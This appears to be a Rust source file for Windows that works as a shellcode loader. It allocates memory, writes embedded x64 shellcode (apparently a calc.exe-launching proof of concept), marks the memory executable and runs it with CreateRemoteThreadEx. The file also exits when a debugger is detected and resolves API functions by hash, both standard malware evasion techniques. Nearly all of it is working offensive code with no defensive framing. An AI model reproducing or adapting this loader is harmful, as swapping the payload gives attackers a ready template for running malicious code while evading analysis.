#![allow(unused_imports)]
#![allow(non_snake_case)]
#![allow(unused_variables)]

use windows::{
    Win32::{
        System::{
            Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
            Diagnostics::Debug::{WriteProcessMemory, IsDebuggerPresent, CheckRemoteDebuggerPresent, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_DIRECTORY_ENTRY_EXPORT}, 
            Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE},
            LibraryLoader::LoadLibraryA,
            SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
        },
        Foundation::{CloseHandle, BOOL, HMODULE},
    },
    core::{PCSTR, Result},
};
use std::{ptr::{self, null_mut, null}, process, mem};


fn getHashFromFunc(funcName: &str) -> u32 {
    // let stringLength: usize = funcName.len();
    let mut hash: u32 = 0x35;

    for c in funcName.chars() {
        hash = (hash.wrapping_mul(0xab10f29f) + c as u32) & 0xffffff;
    }

    hash
}

fn getFuncAddressByHash(lib: &str, hash: u32){
    unsafe {
        let functionAddress: *mut u32 = ptr::null_mut();

        let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());

        let libBase: Result<HMODULE> = LoadLibraryA(lib_ptr);

        match libBase {
            Ok(h) => {
                let base_ptr: *const u8 = h.0 as *const u8;
                println!("[+] Module Handle: {:?}", base_ptr);
                println!("[i] Base pointer address {:?}", base_ptr);
                
                let img_dos_header: &IMAGE_DOS_HEADER = &*(base_ptr as *const IMAGE_DOS_HEADER);

                let nt_headers_addr = base_ptr.add(img_dos_header.e_lfanew as usize);
                println!("[i] IMG_NT_HEADER address: {:?}", nt_headers_addr);

                let img_nt_headers: &IMAGE_NT_HEADERS32 = &*(nt_headers_addr as *const IMAGE_NT_HEADERS32);
                
                let export_directory_RVA: *const u32 = img_nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize].VirtualAddress as *const u32;
                println!("[i] export directory RVA address: {:?}", export_directory_RVA);

                let export_directory_addr = base_ptr.add(export_directory_RVA as usize);
                println!("[i] export directory address: {:?}", export_directory_addr);

                let img_export_directory: &IMAGE_EXPORT_DIRECTORY = &*(export_directory_addr as *const IMAGE_EXPORT_DIRECTORY);

                let addr_fun_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfFunctions as usize) as *const u32;
                println!("[i] address of function RVA : {:?}", addr_fun_RVA);

                let addr_names_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfNames as usize) as *const u32;
                println!("[i] address of names RVA : {:?}", addr_names_RVA);

                let addr_names_ordinals_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfNameOrdinals as usize) as *const u32;
                println!("[i] address of names ordinals RVA : {:?}", addr_names_ordinals_RVA);
            },

            Err(e) => process::exit(-1),
        }
    }
}


fn main() {

    let shellcode: &[u8] = &[
        0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x42, 0x60, 0x48, 0x8b, 0x70, 0x18, 0x48, 0x8b, 0x76, 0x20,
        0x4c, 0x8b, 0x0e, 0x4d, 0x8b, 0x09, 0x4d, 0x8b, 0x49, 0x20, 0xeb, 0x63, 0x41, 0x8b, 0x49, 0x3c,
        0x4d, 0x31, 0xff, 0x41, 0xb7, 0x88, 0x4d, 0x01, 0xcf, 0x49, 0x01, 0xcf, 0x45, 0x8b, 0x3f, 0x4d,
        0x01, 0xcf, 0x41, 0x8b, 0x4f, 0x18, 0x45, 0x8b, 0x77, 0x20, 0x4d, 0x01, 0xce, 0xe3, 0x3f, 0xff,
        0xc9, 0x48, 0x31, 0xf6, 0x41, 0x8b, 0x34, 0x8e, 0x4c, 0x01, 0xce, 0x48, 0x31, 0xc0, 0x48, 0x31,
        0xd2, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xca, 0x0d, 0x01, 0xc2, 0xeb, 0xf4, 0x44, 0x39,
        0xc2, 0x75, 0xda, 0x45, 0x8b, 0x57, 0x24, 0x4d, 0x01, 0xca, 0x41, 0x0f, 0xb7, 0x0c, 0x4a, 0x45,
        0x8b, 0x5f, 0x1c, 0x4d, 0x01, 0xcb, 0x41, 0x8b, 0x04, 0x8b, 0x4c, 0x01, 0xc8, 0xc3, 0xc3, 0x41,
        0xb8, 0x98, 0xfe, 0x8a, 0x0e, 0xe8, 0x92, 0xff, 0xff, 0xff, 0x48, 0x31, 0xc9, 0x51, 0x48, 0xb9,
        0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x51, 0x48, 0x8d, 0x0c, 0x24, 0x48, 0x31, 0xd2,
        0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd0,
    ];

    getFuncAddressByHash("kernel32", 0x00544e304);

    getHashFromFunc("Test");

    let pid = process::id();

    unsafe {

        println!("[i] Trying to open a Handle for the Process {pid}");
        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Ok(hprocess) => 'p: {

                let mut debugger_present: BOOL = BOOL(0);
                
                if CheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL).is_ok() && debugger_present.as_bool() {
                    process::exit(-1);
                }

                if IsDebuggerPresent().as_bool(){
                    process::exit(-1);
                }

                let haddr = VirtualAllocEx(
                    hprocess,
                    Some(null_mut()),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );

                if haddr.is_null() {
                    eprintln!("[!] Failed to Allocate Memory in Target Process.");
                    let _ = CloseHandle(hprocess);
                    process::exit(-1)
                }

                println!("[i] Writing to memory at address {:p}", haddr);
                WriteProcessMemory(
                    hprocess,
                    haddr, 
                    shellcode.as_ptr() as _,
                    shellcode.len(),
                    None,).unwrap_or_else(|e| {
                        eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
                        let _ = CloseHandle(hprocess);
                        process::exit(-1);
                    }
                );

                let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
                VirtualProtectEx(
                    hprocess,
                    haddr,
                    shellcode.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut oldprotect,).unwrap_or_else(|e| {
                    eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
                    let _ = CloseHandle(hprocess);
                    process::exit(-1);
                });
                
                println!("[+] Creating a Remote Thread");
                let hthread = CreateRemoteThreadEx(
                    hprocess,
                    Some(null()),
                    0,
                    Some(std::mem::transmute(haddr)),
                    Some(null()),
                    0,
                    None,
                    Some(null_mut()),).unwrap_or_else(|e| {
                        eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
                        let _ = CloseHandle(hprocess);
                        process::exit(-1);
                    }
                );

                WaitForSingleObject(hthread, INFINITE);

                let _ = CloseHandle(hthread);
                println!("[i] Closed thread handle");

                let _ = CloseHandle(hprocess);
                println!("[i] Closed process handle");

                let _ = VirtualFree(haddr, 0, MEM_RELEASE);
                println!("[i] Memory released");


                println!("[+] Executed!");
                break 'p;
            }
            Err(pid) => {
                eprintln!("[!] Error Getting Process Identifier {pid}");
            }
        }
    }
}